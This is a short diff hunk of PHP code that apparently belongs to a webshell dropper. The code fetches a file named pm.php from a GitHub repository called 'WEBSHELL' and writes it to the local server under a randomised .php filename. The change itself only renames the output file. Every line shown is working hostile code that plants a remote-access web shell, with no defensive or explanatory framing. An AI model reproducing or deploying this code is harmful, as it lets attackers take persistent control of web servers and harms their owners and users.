@@ -193,7 +193,7 @@ if(file_exists($check21)){
     echo "Done Reset ===>  ".$check21."</br>";
 }else 
 echo "Fail Reset" ;
-$check28 = "./".$ra44.".php" ;
+$check28 = "./".$ra44."x.php" ;
 $text28 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/pm.php');
 $open28 = fopen($check28, 'w');
 fwrite($open28, $text28);
